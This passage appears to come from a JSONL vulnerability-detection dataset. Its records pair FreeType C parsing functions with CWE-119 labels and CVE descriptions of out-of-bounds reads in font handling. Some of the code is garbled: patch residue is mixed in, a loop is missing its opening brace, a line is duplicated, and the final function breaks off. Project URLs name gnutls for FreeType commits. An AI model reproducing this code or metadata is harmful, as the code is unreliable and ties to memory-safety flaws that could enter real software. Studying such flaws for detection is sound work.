"https://nvd.nist.gov/vuln/detail/CVE-2012-5670"}
{"idx": 158026, "project": "savannah", "commit_id": "07bdb6e289c7954e2a533039dc93c1c136099d2d", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=07bdb6e289c7954e2a533039dc93c1c136099d2d", "commit_message": "None", "target": 0, "func": "  _bdf_parse_glyphs( char*          line,\n                     unsigned long  linelen,\n                     unsigned long  lineno,\n                     void*          call_data,\n                     void*          client_data )\n  {\n    int                c, mask_index;\n    char*              s;\n    unsigned char*     bp;\n    unsigned long      i, slen, nibbles;\n\n    _bdf_parse_t*      p;\n    bdf_glyph_t*       glyph;\n    bdf_font_t*        font;\n\n    FT_Memory          memory;\n    FT_Error           error = BDF_Err_Ok;\n\n    FT_UNUSED( call_data );\n    FT_UNUSED( lineno );        /* only used in debug mode */\n\n\n    p = (_bdf_parse_t *)client_data;\n\n    font   = p->font;\n    memory = font->memory;\n\n    /* Check for a comment. */\n    if ( ft_memcmp( line, \"COMMENT\", 7 ) == 0 )\n    {\n      linelen -= 7;\n\n      s = line + 7;\n      if ( *s != 0 )\n      {\n        s++;\n        linelen--;\n      }\n      error = _bdf_add_comment( p->font, s, linelen );\n      goto Exit;\n    }\n\n    /* The very first thing expected is the number of glyphs. */\n    if ( !( p->flags & _BDF_GLYPHS ) )\n    {\n      if ( ft_memcmp( line, \"CHARS\", 5 ) != 0 )\n      {\n        FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG1, lineno, \"CHARS\" ));\n        error = BDF_Err_Missing_Chars_Field;\n        goto Exit;\n      }\n\n      error = _bdf_list_split( &p->list, (char *)\" +\", line, linelen );\n      if ( error )\n        goto Exit;\n      p->cnt = font->glyphs_size = _bdf_atoul( p->list.field[1], 0, 10 );\n\n      /* Make sure the number of glyphs is non-zero. */\n      if ( p->cnt == 0 )\n        font->glyphs_size = 64;\n\n      /* Limit ourselves to 1,114,112 glyphs in the font (this is the */\n      /* number of code points available in Unicode).                 */\n      if ( p->cnt >= 0x110000UL )\n      {\n        FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG5, lineno, \"CHARS\" ));\n        error = BDF_Err_Invalid_Argument;\n        goto Exit;\n      }\n\n      if ( FT_NEW_ARRAY( font->glyphs, font->glyphs_size ) )\n        goto Exit;\n\n      p->flags |= _BDF_GLYPHS;\n\n      goto Exit;\n    }\n\n    /* Check for the ENDFONT field. */\n    if ( ft_memcmp( line, \"ENDFONT\", 7 ) == 0 )\n    {\n      /* Sort the glyphs by encoding. */\n      ft_qsort( (char *)font->glyphs,\n                font->glyphs_used,\n                sizeof ( bdf_glyph_t ),\n                by_encoding );\n\n      p->flags &= ~_BDF_START;\n\n      goto Exit;\n    }\n\n    /* Check for the ENDCHAR field. */\n    if ( ft_memcmp( line, \"ENDCHAR\", 7 ) == 0 )\n    {\n      p->glyph_enc = 0;\n      p->flags    &= ~_BDF_GLYPH_BITS;\n\n      goto Exit;\n    }\n\n    /* Check whether a glyph is being scanned but should be */\n    /* ignored because it is an unencoded glyph.            */\n    if ( ( p->flags & _BDF_GLYPH )     &&\n         p->glyph_enc            == -1 &&\n         p->opts->keep_unencoded == 0  )\n      goto Exit;\n\n    /* Check for the STARTCHAR field. */\n    if ( ft_memcmp( line, \"STARTCHAR\", 9 ) == 0 )\n    {\n      /* Set the character name in the parse info first until the */\n      /* encoding can be checked for an unencoded character.      */\n      FT_FREE( p->glyph_name );\n\n      error = _bdf_list_split( &p->list, (char *)\" +\", line, linelen );\n      if ( error )\n        goto Exit;\n\n      _bdf_list_shift( &p->list, 1 );\n\n      s = _bdf_list_join( &p->list, ' ', &slen );\n\n      if ( !s )\n      {\n        FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG8, lineno, \"STARTCHAR\" ));\n        error = BDF_Err_Invalid_File_Format;\n        goto Exit;\n      }\n\n      if ( FT_NEW_ARRAY( p->glyph_name, slen + 1 ) )\n        goto Exit;\n\n      FT_MEM_COPY( p->glyph_name, s, slen + 1 );\n\n      p->flags |= _BDF_GLYPH;\n\n      FT_TRACE4(( DBGMSG1, lineno, s ));\n\n      goto Exit;\n    }\n\n    /* Check for the ENCODING field. */\n    if ( ft_memcmp( line, \"ENCODING\", 8 ) == 0 )\n    {\n      if ( !( p->flags & _BDF_GLYPH ) )\n      {\n        /* Missing STARTCHAR field. */\n        FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG1, lineno, \"STARTCHAR\" ));\n        error = BDF_Err_Missing_Startchar_Field;\n        goto Exit;\n      }\n\n      error = _bdf_list_split( &p->list, (char *)\" +\", line, linelen );\n      if ( error )\n        goto Exit;\n\n      p->glyph_enc = _bdf_atol( p->list.field[1], 0, 10 );\n\n      /* Normalize negative encoding values.  The specification only */\n      /* allows -1, but we can be more generous here.                */\n      if ( p->glyph_enc < -1 )\n        p->glyph_enc = -1;\n\n      /* Check for alternative encoding format. */\n      if ( p->glyph_enc == -1 && p->list.used > 2 )\n        p->glyph_enc = _bdf_atol( p->list.field[2], 0, 10 );\n\n      FT_TRACE4(( DBGMSG2, p->glyph_enc ));\n \n       /* Check that the encoding is in the Unicode range because  */\n       /* otherwise p->have (a bitmap with static size) overflows. */\n      if ( p->glyph_enc > 0                                      &&\n           (size_t)p->glyph_enc >= sizeof ( p->have ) /\n                                   sizeof ( unsigned long ) * 32 )\n       {\n         FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG5, lineno, \"ENCODING\" ));\n         error = BDF_Err_Invalid_File_Format;\n      }\n\n      /* Check whether this encoding has already been encountered. */\n      /* If it has then change it to unencoded so it gets added if */\n      /* indicated.                                                */\n      if ( p->glyph_enc >= 0 )\n      {\n        if ( _bdf_glyph_modified( p->have, p->glyph_enc ) )\n        {\n          /* Emit a message saying a glyph has been moved to the */\n          /* unencoded area.                                     */\n          FT_TRACE2(( \"_bdf_parse_glyphs: \" ACMSG12,\n                      p->glyph_enc, p->glyph_name ));\n          p->glyph_enc = -1;\n          font->modified = 1;\n        }\n        else\n          _bdf_set_glyph_modified( p->have, p->glyph_enc );\n      }\n\n      if ( p->glyph_enc >= 0 )\n      {\n        /* Make sure there are enough glyphs allocated in case the */\n        /* number of characters happen to be wrong.                */\n        if ( font->glyphs_used == font->glyphs_size )\n        {\n          if ( FT_RENEW_ARRAY( font->glyphs,\n                               font->glyphs_size,\n                               font->glyphs_size + 64 ) )\n            goto Exit;\n\n          font->glyphs_size += 64;\n        }\n\n        glyph           = font->glyphs + font->glyphs_used++;\n        glyph->name     = p->glyph_name;\n        glyph->encoding = p->glyph_enc;\n\n        /* Reset the initial glyph info. */\n        p->glyph_name = 0;\n      }\n      else\n      {\n        /* Unencoded glyph.  Check whether it should */\n        /* be added or not.                          */\n        if ( p->opts->keep_unencoded != 0 )\n        {\n          /* Allocate the next unencoded glyph. */\n          if ( font->unencoded_used == font->unencoded_size )\n          {\n            if ( FT_RENEW_ARRAY( font->unencoded ,\n                                 font->unencoded_size,\n                                 font->unencoded_size + 4 ) )\n              goto Exit;\n\n            font->unencoded_size += 4;\n          }\n\n          glyph           = font->unencoded + font->unencoded_used;\n          glyph->name     = p->glyph_name;\n          glyph->encoding = font->unencoded_used++;\n        }\n        else\n          /* Free up the glyph name if the unencoded shouldn't be */\n          /* kept.                                                */\n          FT_FREE( p->glyph_name );\n\n        p->glyph_name = 0;\n      }\n\n      /* Clear the flags that might be added when width and height are */\n      /* checked for consistency.                                      */\n      p->flags &= ~( _BDF_GLYPH_WIDTH_CHECK | _BDF_GLYPH_HEIGHT_CHECK );\n\n      p->flags |= _BDF_ENCODING;\n\n      goto Exit;\n    }\n\n    /* Point at the glyph being constructed. */\n    if ( p->glyph_enc == -1 )\n      glyph = font->unencoded + ( font->unencoded_used - 1 );\n    else\n      glyph = font->glyphs + ( font->glyphs_used - 1 );\n\n    /* Check whether a bitmap is being constructed. */\n    if ( p->flags & _BDF_BITMAP )\n    {\n      /* If there are more rows than are specified in the glyph metrics, */\n      /* ignore the remaining lines.                                     */\n      if ( p->row >= (unsigned long)glyph->bbx.height )\n      {\n        if ( !( p->flags & _BDF_GLYPH_HEIGHT_CHECK ) )\n        {\n          FT_TRACE2(( \"_bdf_parse_glyphs: \" ACMSG13, glyph->encoding ));\n          p->flags |= _BDF_GLYPH_HEIGHT_CHECK;\n          font->modified = 1;\n        }\n\n        goto Exit;\n      }\n\n      /* Only collect the number of nibbles indicated by the glyph     */\n      /* metrics.  If there are more columns, they are simply ignored. */\n      nibbles = glyph->bpr << 1;\n      bp      = glyph->bitmap + p->row * glyph->bpr;\n\n      for ( i = 0; i < nibbles; i++ )\n      {\n        c = line[i];\n        if ( !sbitset( hdigits, c ) )\n          break;\n        *bp = (FT_Byte)( ( *bp << 4 ) + a2i[c] );\n        if ( i + 1 < nibbles && ( i & 1 ) )\n          *++bp = 0;\n      }\n\n      /* If any line has not enough columns,            */\n      /* indicate they have been padded with zero bits. */\n      if ( i < nibbles                            &&\n           !( p->flags & _BDF_GLYPH_WIDTH_CHECK ) )\n      {\n        FT_TRACE2(( \"_bdf_parse_glyphs: \" ACMSG16, glyph->encoding ));\n        p->flags       |= _BDF_GLYPH_WIDTH_CHECK;\n        font->modified  = 1;\n      }\n\n      /* Remove possible garbage at the right. */\n      mask_index = ( glyph->bbx.width * p->font->bpp ) & 7;\n      if ( glyph->bbx.width )\n        *bp &= nibble_mask[mask_index];\n\n      /* If any line has extra columns, indicate they have been removed. */\n      if ( i == nibbles                           &&\n           sbitset( hdigits, line[nibbles] )      &&\n           !( p->flags & _BDF_GLYPH_WIDTH_CHECK ) )\n      {\n        FT_TRACE2(( \"_bdf_parse_glyphs: \" ACMSG14, glyph->encoding ));\n        p->flags       |= _BDF_GLYPH_WIDTH_CHECK;\n        font->modified  = 1;\n      }\n\n      p->row++;\n      goto Exit;\n    }\n\n    /* Expect the SWIDTH (scalable width) field next. */\n    if ( ft_memcmp( line, \"SWIDTH\", 6 ) == 0 )\n    {\n      if ( !( p->flags & _BDF_ENCODING ) )\n        goto Missing_Encoding;\n\n      error = _bdf_list_split( &p->list, (char *)\" +\", line, linelen );\n      if ( error )\n        goto Exit;\n\n      glyph->swidth = (unsigned short)_bdf_atoul( p->list.field[1], 0, 10 );\n      p->flags |= _BDF_SWIDTH;\n\n      goto Exit;\n    }\n\n    /* Expect the DWIDTH (scalable width) field next. */\n    if ( ft_memcmp( line, \"DWIDTH\", 6 ) == 0 )\n    {\n      if ( !( p->flags & _BDF_ENCODING ) )\n        goto Missing_Encoding;\n\n      error = _bdf_list_split( &p->list, (char *)\" +\", line, linelen );\n      if ( error )\n        goto Exit;\n\n      glyph->dwidth = (unsigned short)_bdf_atoul( p->list.field[1], 0, 10 );\n\n      if ( !( p->flags & _BDF_SWIDTH ) )\n      {\n        /* Missing SWIDTH field.  Emit an auto correction message and set */\n        /* the scalable width from the device width.                      */\n        FT_TRACE2(( \"_bdf_parse_glyphs: \" ACMSG9, lineno ));\n\n        glyph->swidth = (unsigned short)FT_MulDiv(\n                          glyph->dwidth, 72000L,\n                          (FT_Long)( font->point_size *\n                                     font->resolution_x ) );\n      }\n\n      p->flags |= _BDF_DWIDTH;\n      goto Exit;\n    }\n\n    /* Expect the BBX field next. */\n    if ( ft_memcmp( line, \"BBX\", 3 ) == 0 )\n    {\n      if ( !( p->flags & _BDF_ENCODING ) )\n        goto Missing_Encoding;\n\n      error = _bdf_list_split( &p->list, (char *)\" +\", line, linelen );\n      if ( error )\n        goto Exit;\n\n      glyph->bbx.width    = _bdf_atos( p->list.field[1], 0, 10 );\n      glyph->bbx.height   = _bdf_atos( p->list.field[2], 0, 10 );\n      glyph->bbx.x_offset = _bdf_atos( p->list.field[3], 0, 10 );\n      glyph->bbx.y_offset = _bdf_atos( p->list.field[4], 0, 10 );\n\n      /* Generate the ascent and descent of the character. */\n      glyph->bbx.ascent  = (short)( glyph->bbx.height + glyph->bbx.y_offset );\n      glyph->bbx.descent = (short)( -glyph->bbx.y_offset );\n\n      /* Determine the overall font bounding box as the characters are */\n      /* loaded so corrections can be done later if indicated.         */\n      p->maxas    = (short)FT_MAX( glyph->bbx.ascent, p->maxas );\n      p->maxds    = (short)FT_MAX( glyph->bbx.descent, p->maxds );\n\n      p->rbearing = (short)( glyph->bbx.width + glyph->bbx.x_offset );\n\n      p->maxrb    = (short)FT_MAX( p->rbearing, p->maxrb );\n      p->minlb    = (short)FT_MIN( glyph->bbx.x_offset, p->minlb );\n      p->maxlb    = (short)FT_MAX( glyph->bbx.x_offset, p->maxlb );\n\n      if ( !( p->flags & _BDF_DWIDTH ) )\n      {\n        /* Missing DWIDTH field.  Emit an auto correction message and set */\n        /* the device width to the glyph width.                           */\n        FT_TRACE2(( \"_bdf_parse_glyphs: \" ACMSG10, lineno ));\n        glyph->dwidth = glyph->bbx.width;\n      }\n\n      /* If the BDF_CORRECT_METRICS flag is set, then adjust the SWIDTH */\n      /* value if necessary.                                            */\n      if ( p->opts->correct_metrics != 0 )\n      {\n        /* Determine the point size of the glyph. */\n        unsigned short  sw = (unsigned short)FT_MulDiv(\n                               glyph->dwidth, 72000L,\n                               (FT_Long)( font->point_size *\n                                          font->resolution_x ) );\n\n\n        if ( sw != glyph->swidth )\n        {\n          glyph->swidth = sw;\n\n          if ( p->glyph_enc == -1 )\n            _bdf_set_glyph_modified( font->umod,\n                                     font->unencoded_used - 1 );\n          else\n            _bdf_set_glyph_modified( font->nmod, glyph->encoding );\n\n          p->flags       |= _BDF_SWIDTH_ADJ;\n          font->modified  = 1;\n        }\n      }\n\n      p->flags |= _BDF_BBX;\n      goto Exit;\n    }\n\n    /* And finally, gather up the bitmap. */\n    if ( ft_memcmp( line, \"BITMAP\", 6 ) == 0 )\n    {\n      unsigned long  bitmap_size;\n\n\n      if ( !( p->flags & _BDF_BBX ) )\n      {\n        /* Missing BBX field. */\n        FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG1, lineno, \"BBX\" ));\n        error = BDF_Err_Missing_Bbx_Field;\n        goto Exit;\n      }\n\n      /* Allocate enough space for the bitmap. */\n      glyph->bpr = ( glyph->bbx.width * p->font->bpp + 7 ) >> 3;\n\n      bitmap_size = glyph->bpr * glyph->bbx.height;\n      if ( glyph->bpr > 0xFFFFU || bitmap_size > 0xFFFFU )\n      {\n        FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG4, lineno ));\n        error = BDF_Err_Bbx_Too_Big;\n        goto Exit;\n      }\n      else\n        glyph->bytes = (unsigned short)bitmap_size;\n\n      if ( FT_NEW_ARRAY( glyph->bitmap, glyph->bytes ) )\n        goto Exit;\n\n      p->row    = 0;\n      p->flags |= _BDF_BITMAP;\n\n      goto Exit;\n    }\n\n    FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG9, lineno ));\n    error = BDF_Err_Invalid_File_Format;\n    goto Exit;\n\n  Missing_Encoding:\n    /* Missing ENCODING field. */\n    FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG1, lineno, \"ENCODING\" ));\n    error = BDF_Err_Missing_Encoding_Field;\n\n  Exit:\n    if ( error && ( p->flags & _BDF_GLYPH ) )\n      FT_FREE( p->glyph_name );\n\n    return error;\n  }\n", "func_hash": 112133374329751410214358441913282019949, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2012-5669", "cve_desc": "The _bdf_parse_glyphs function in FreeType before 2.4.11 allows context-dependent attackers to cause a denial of service (crash) and possibly execute arbitrary code via vectors related to BDF fonts and an incorrect calculation that triggers an out-of-bounds read.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-5669"}
{"idx": 158039, "project": "savannah", "commit_id": "18a8f0d9943369449bc4de92d411c78fb08d616c", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=18a8f0d9943369449bc4de92d411c78fb08d616c", "commit_message": "None", "target": 0, "func": "  parse_fond( char*   fond_data,\n              short*  have_sfnt,\n              ResID*  sfnt_id,\n              Str255  lwfn_file_name,\n              short   face_index )\n  {\n    AsscEntry*  assoc;\n    AsscEntry*  base_assoc;\n    FamRec*     fond;\n\n\n    *sfnt_id          = 0;\n    *have_sfnt        = 0;\n    lwfn_file_name[0] = 0;\n\n    fond       = (FamRec*)fond_data;\n    assoc      = (AsscEntry*)( fond_data + sizeof ( FamRec ) + 2 );\n    base_assoc = assoc;\n\n    /* the maximum faces in a FOND is 48, size of StyleTable.indexes[] */\n    if ( 47 < face_index )\n      return;\n\n    /* Let's do a little range checking before we get too excited here */\n    if ( face_index < count_faces_sfnt( fond_data ) )\n    {\n      assoc += face_index;        /* add on the face_index! */\n\n      /* if the face at this index is not scalable,\n         fall back to the first one (old behavior) */\n      if ( EndianS16_BtoN( assoc->fontSize ) == 0 )\n      {\n        *have_sfnt = 1;\n        *sfnt_id   = EndianS16_BtoN( assoc->fontID );\n      }\n      else if ( base_assoc->fontSize == 0 )\n      {\n        *have_sfnt = 1;\n        *sfnt_id   = EndianS16_BtoN( base_assoc->fontID );\n      }\n    }\n\n    if ( EndianS32_BtoN( fond->ffStylOff ) )\n    {\n      unsigned char*  p = (unsigned char*)fond_data;\n      StyleTable*     style;\n      unsigned short  string_count;\n      char            ps_name[256];\n      unsigned char*  names[64];\n      int             i;\n\n\n      p += EndianS32_BtoN( fond->ffStylOff );\n       style = (StyleTable*)p;\n       p += sizeof ( StyleTable );\n       string_count = EndianS16_BtoN( *(short*)(p) );\n      string_count = FT_MIN( 64, string_count );\n       p += sizeof ( short );\n \n      for ( i = 0; i < string_count; i++ )\n       {\n         names[i] = p;\n         p       += names[i][0];\n      }\n\n      {\n        size_t  ps_name_len = (size_t)names[0][0];\n\n\n        if ( ps_name_len != 0 )\n        {\n          ft_memcpy(ps_name, names[0] + 1, ps_name_len);\n          ps_name[ps_name_len] = 0;\n           ps_name[ps_name_len] = 0;\n         }\n         if ( style->indexes[face_index] > 1 &&\n             style->indexes[face_index] <= string_count )\n         {\n           unsigned char*  suffixes = names[style->indexes[face_index] - 1];\n          for ( i = 1; i <= suffixes[0]; i++ )\n          {\n            unsigned char*  s;\n            size_t          j = suffixes[i] - 1;\n\n\n            if ( j < string_count && ( s = names[j] ) != NULL )\n            {\n              size_t  s_len = (size_t)s[0];\n\n\n              if ( s_len != 0 && ps_name_len + s_len < sizeof ( ps_name ) )\n              {\n                ft_memcpy( ps_name + ps_name_len, s + 1, s_len );\n                ps_name_len += s_len;\n                ps_name[ps_name_len] = 0;\n              }\n            }\n          }\n        }\n      }\n\n      create_lwfn_name( ps_name, lwfn_file_name );\n    }\n  }\n", "func_hash": 183885571031352663780341239821456219872, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2014-9672", "cve_desc": "Array index error in the parse_fond function in base/ftmac.c in FreeType before 2.5.4 allows remote attackers to cause a denial of service (out-of-bounds read) or obtain sensitive information from process memory via a crafted FOND resource in a Mac font file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-9672"}
{"idx": 158060, "project": "savannah", "commit_id": "f0292bb9920aa1dbfed5f53861e7c7a89b35833a", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=f0292bb9920aa1dbfed5f53861e7c7a89b35833a", "commit_message": "None", "target": 0, "func": "  tt_sbit_decoder_load_image( TT_SBitDecoder  decoder,\n                              FT_UInt         glyph_index,\n                              FT_Int          x_pos,\n                              FT_Int          y_pos )\n  {\n    /*\n     *  First, we find the correct strike range that applies to this\n     *  glyph index.\n     */\n\n    FT_Byte*  p          = decoder->eblc_base + decoder->strike_index_array;\n    FT_Byte*  p_limit    = decoder->eblc_limit;\n    FT_ULong  num_ranges = decoder->strike_index_count;\n    FT_UInt   start, end, index_format, image_format;\n    FT_ULong  image_start = 0, image_end = 0, image_offset;\n\n\n    for ( ; num_ranges > 0; num_ranges-- )\n    {\n      start = FT_NEXT_USHORT( p );\n      end   = FT_NEXT_USHORT( p );\n\n      if ( glyph_index >= start && glyph_index <= end )\n        goto FoundRange;\n\n      p += 4;  /* ignore index offset */\n    }\n    goto NoBitmap;\n\n  FoundRange:\n    image_offset = FT_NEXT_ULONG( p );\n\n    /* overflow check */\n    p = decoder->eblc_base + decoder->strike_index_array;\n    if ( image_offset > (FT_ULong)( p_limit - p ) )\n      goto Failure;\n\n    p += image_offset;\n    if ( p + 8 > p_limit )\n      goto NoBitmap;\n\n    /* now find the glyph's location and extend within the ebdt table */\n    index_format = FT_NEXT_USHORT( p );\n    image_format = FT_NEXT_USHORT( p );\n    image_offset = FT_NEXT_ULONG ( p );\n\n    switch ( index_format )\n    {\n    case 1: /* 4-byte offsets relative to `image_offset' */\n      p += 4 * ( glyph_index - start );\n      if ( p + 8 > p_limit )\n        goto NoBitmap;\n\n      image_start = FT_NEXT_ULONG( p );\n      image_end   = FT_NEXT_ULONG( p );\n\n      if ( image_start == image_end )  /* missing glyph */\n        goto NoBitmap;\n      break;\n\n    case 2: /* big metrics, constant image size */\n      {\n        FT_ULong  image_size;\n\n\n        if ( p + 12 > p_limit )\n          goto NoBitmap;\n\n        image_size = FT_NEXT_ULONG( p );\n\n        if ( tt_sbit_decoder_load_metrics( decoder, &p, p_limit, 1 ) )\n          goto NoBitmap;\n\n        image_start = image_size * ( glyph_index - start );\n        image_end   = image_start + image_size;\n      }\n      break;\n\n    case 3: /* 2-byte offsets relative to 'image_offset' */\n      p += 2 * ( glyph_index - start );\n      if ( p + 4 > p_limit )\n        goto NoBitmap;\n\n      image_start = FT_NEXT_USHORT( p );\n      image_end   = FT_NEXT_USHORT( p );\n\n      if ( image_start == image_end )  /* missing glyph */\n        goto NoBitmap;\n      break;\n\n    case 4: /* sparse glyph array with (glyph,offset) pairs */\n      {\n        FT_ULong  mm, num_glyphs;\n\n\n        if ( p + 4 > p_limit )\n          goto NoBitmap;\n\n         num_glyphs = FT_NEXT_ULONG( p );\n \n         /* overflow check for p + ( num_glyphs + 1 ) * 4 */\n        if ( p + 4 > p_limit                                         ||\n             num_glyphs > (FT_ULong)( ( ( p_limit - p ) >> 2 ) - 1 ) )\n           goto NoBitmap;\n \n         for ( mm = 0; mm < num_glyphs; mm++ )\n          FT_UInt  gindex = FT_NEXT_USHORT( p );\n\n\n          if ( gindex == glyph_index )\n          {\n            image_start = FT_NEXT_USHORT( p );\n            p          += 2;\n            image_end   = FT_PEEK_USHORT( p );\n            break;\n          }\n          p += 2;\n        }\n\n        if ( mm >= num_glyphs )\n          goto NoBitmap;\n      }\n      break;\n\n    case 5: /* constant metrics with sparse glyph codes */\n    case 19:\n      {\n        FT_ULong  image_size, mm, num_glyphs;\n\n\n        if ( p + 16 > p_limit )\n          goto NoBitmap;\n\n        image_size = FT_NEXT_ULONG( p );\n\n        if ( tt_sbit_decoder_load_metrics( decoder, &p, p_limit, 1 ) )\n          goto NoBitmap;\n\n        num_glyphs = FT_NEXT_ULONG( p );\n\n        /* overflow check for p + 2 * num_glyphs */\n        if ( num_glyphs > (FT_ULong)( ( p_limit - p ) >> 1 ) )\n          goto NoBitmap;\n\n        for ( mm = 0; mm < num_glyphs; mm++ )\n        {\n          FT_UInt  gindex = FT_NEXT_USHORT( p );\n\n\n          if ( gindex == glyph_index )\n            break;\n        }\n\n        if ( mm >= num_glyphs )\n          goto NoBitmap;\n\n        image_start = image_size * mm;\n        image_end   = image_start + image_size;\n      }\n      break;\n\n    default:\n      goto NoBitmap;\n    }\n", "func_hash": 174846873576513811633114180196953003240, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2014-9656", "cve_desc": "The tt_sbit_decoder_load_image function in sfnt/ttsbit.c in FreeType before 2.5.4 does not properly check for an integer overflow, which allows remote attackers to cause a denial of service (out-of-bounds read) or possibly have unspecified other impact via a crafted OpenType font.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-9656"}
{"idx": 158064, "project": "savannah", "commit_id": "3774fc08b502c3e685afca098b6e8a195aded6a0", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=3774fc08b502c3e685afca098b6e8a195aded6a0", "commit_message": "None", "target": 0, "func": "  ps_parser_to_token( PS_Parser  parser,\n                      T1_Token   token )\n  {\n    FT_Byte*  cur;\n    FT_Byte*  limit;\n    FT_Int    embed;\n\n\n    token->type  = T1_TOKEN_TYPE_NONE;\n    token->start = NULL;\n    token->limit = NULL;\n\n    /* first of all, skip leading whitespace */\n    ps_parser_skip_spaces( parser );\n\n    cur   = parser->cursor;\n    limit = parser->limit;\n\n    if ( cur >= limit )\n      return;\n\n    switch ( *cur )\n    {\n      /************* check for literal string *****************/\n    case '(':\n      token->type  = T1_TOKEN_TYPE_STRING;\n      token->start = cur;\n\n      if ( skip_literal_string( &cur, limit ) == FT_Err_Ok )\n        token->limit = cur;\n      break;\n\n      /************* check for programs/array *****************/\n    case '{':\n      token->type  = T1_TOKEN_TYPE_ARRAY;\n      token->start = cur;\n\n      if ( skip_procedure( &cur, limit ) == FT_Err_Ok )\n        token->limit = cur;\n      break;\n\n      /************* check for table/array ********************/\n      /* XXX: in theory we should also look for \"<<\"          */\n      /*      since this is semantically equivalent to \"[\";   */\n      /*      in practice it doesn't matter (?)               */\n    case '[':\n      token->type  = T1_TOKEN_TYPE_ARRAY;\n      embed        = 1;\n      token->start = cur++;\n\n      /* we need this to catch `[ ]' */\n      parser->cursor = cur;\n      ps_parser_skip_spaces( parser );\n      cur = parser->cursor;\n\n      while ( cur < limit && !parser->error )\n      {\n        /* XXX: this is wrong because it does not      */\n        /*      skip comments, procedures, and strings */\n        if ( *cur == '[' )\n          embed++;\n        else if ( *cur == ']' )\n        {\n          embed--;\n          if ( embed <= 0 )\n          {\n            token->limit = ++cur;\n            break;\n          }\n        }\n\n        parser->cursor = cur;\n        ps_parser_skip_PS_token( parser );\n        /* we need this to catch `[XXX ]' */\n        ps_parser_skip_spaces  ( parser );\n        cur = parser->cursor;\n      }\n      break;\n\n      /* ************ otherwise, it is any token **************/\n    default:\n      token->start = cur;\n      token->type  = ( *cur == '/' ) ? T1_TOKEN_TYPE_KEY : T1_TOKEN_TYPE_ANY;\n      ps_parser_skip_PS_token( parser );\n      cur = parser->cursor;\n      if ( !parser->error )\n        token->limit = cur;\n    }\n\n    if ( !token->limit )\n    {\n      token->start = NULL;\n      token->type  = T1_TOKEN_TYPE_NONE;\n    }\n\n    parser->cursor = cur;\n  }\n\n\n  /* NB: `tokens' can be NULL if we only want to count */\n  /* the number of array elements                      */\n\n  FT_LOCAL_DEF( void )\n  ps_parser_to_token_array( PS_Parser  parser,\n                            T1_Token   tokens,\n                            FT_UInt    max_tokens,\n                            FT_Int*    pnum_tokens )\n  {\n    T1_TokenRec  master;\n\n\n    *pnum_tokens = -1;\n\n    /* this also handles leading whitespace */\n    ps_parser_to_token( parser, &master );\n\n    if ( master.type == T1_TOKEN_TYPE_ARRAY )\n    {\n      FT_Byte*  old_cursor = parser->cursor;\n      FT_Byte*  old_limit  = parser->limit;\n      T1_Token  cur        = tokens;\n      T1_Token  limit      = cur + max_tokens;\n\n\n      /* don't include outermost delimiters */\n      parser->cursor = master.start + 1;\n      parser->limit  = master.limit - 1;\n\n      while ( parser->cursor < parser->limit )\n      {\n        T1_TokenRec  token;\n\n\n        ps_parser_to_token( parser, &token );\n        if ( !token.type )\n          break;\n\n        if ( tokens && cur < limit )\n          *cur = token;\n\n        cur++;\n      }\n\n      *pnum_tokens = (FT_Int)( cur - tokens );\n\n      parser->cursor = old_cursor;\n      parser->limit  = old_limit;\n    }\n  }\n\n\n  /* first character must be a delimiter or a part of a number */\n  /* NB: `coords' can be NULL if we just want to skip the      */\n  /*     array; in this case we ignore `max_coords'            */\n\n  static FT_Int\n  ps_tocoordarray( FT_Byte*  *acur,\n                   FT_Byte*   limit,\n                   FT_Int     max_coords,\n                   FT_Short*  coords )\n  {\n    FT_Byte*  cur   = *acur;\n    FT_Int    count = 0;\n    FT_Byte   c, ender;\n\n\n    if ( cur >= limit )\n      goto Exit;\n\n    /* check for the beginning of an array; otherwise, only one number */\n    /* will be read                                                    */\n    c     = *cur;\n    ender = 0;\n\n    if ( c == '[' )\n      ender = ']';\n    else if ( c == '{' )\n      ender = '}';\n\n    if ( ender )\n      cur++;\n\n    /* now, read the coordinates */\n    while ( cur < limit )\n    {\n      FT_Short  dummy;\n      FT_Byte*  old_cur;\n\n\n      /* skip whitespace in front of data */\n      skip_spaces( &cur, limit );\n      if ( cur >= limit )\n        goto Exit;\n\n      if ( *cur == ender )\n      {\n        cur++;\n        break;\n      }\n\n      old_cur = cur;\n\n      if ( coords && count >= max_coords )\n        break;\n\n      /* call PS_Conv_ToFixed() even if coords == NULL */\n      /* to properly parse number at `cur'             */\n      *( coords ? &coords[count] : &dummy ) =\n        (FT_Short)( PS_Conv_ToFixed( &cur, limit, 0 ) >> 16 );\n\n      if ( old_cur == cur )\n      {\n        count = -1;\n        goto Exit;\n      }\n      else\n        count++;\n\n      if ( !ender )\n        break;\n    }\n\n  Exit:\n    *acur = cur;\n    return count;\n  }\n\n\n  /* first character must be a delimiter or a part of a number */\n  /* NB: `values' can be NULL if we just want to skip the      */\n  /*     array; in this case we ignore `max_values'            */\n  /*                                                           */\n  /* return number of successfully parsed values               */\n\n  static FT_Int\n  ps_tofixedarray( FT_Byte*  *acur,\n                   FT_Byte*   limit,\n                   FT_Int     max_values,\n                   FT_Fixed*  values,\n                   FT_Int     power_ten )\n  {\n    